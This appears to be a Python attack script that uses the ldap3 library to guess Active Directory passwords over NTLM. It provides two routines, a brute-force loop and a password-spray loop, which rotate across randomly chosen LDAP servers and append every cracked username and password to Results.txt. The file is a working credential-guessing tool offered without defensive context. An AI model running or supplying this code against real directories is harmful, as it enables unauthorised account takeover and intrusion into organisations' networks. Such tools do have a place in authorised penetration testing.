from ldap3 import Server, Connection, ALL, NTLM
import random

def validate_Active_Directory_creds(username, password,ldap_server):
    server = Server(ldap_server, get_info=ALL)
    conn = Connection(server, user=username, password=password, authentication=NTLM)
    conn.bind()
    if not conn.bind():
        if 'invalidCredentials' in str(conn.result):
            return False
        else:
            print('error in bind', conn.result)
    conn.extend.standard.who_am_i()
    return True

def AD_brute_force(user_list, password_array, server_list):
    for user in user_list:
        passwords = password_array
        random.shuffle(password_array)
        while len(passwords) > 0:
            password = passwords.pop()
            server = 'ldap://' +random.choice(server_list)
            if validate_Active_Directory_creds(user,password,server):
                with open("Results.txt", "a") as myfile:
                    myfile.write(user+" has password "+ password + "\n")

def AD_password_spray(user_list, password_array, server_list):
    for password in password_array:
        users = user_list
        random.shuffle(user_list)
        while len(users) > 0:
            user = users.pop()
            server = 'ldap://' +random.choice(server_list)
            if validate_Active_Directory_creds(user,password,server):
                with open("Results.txt", "a") as myfile:
                    myfile.write(user+" has password "+ password + "\n")



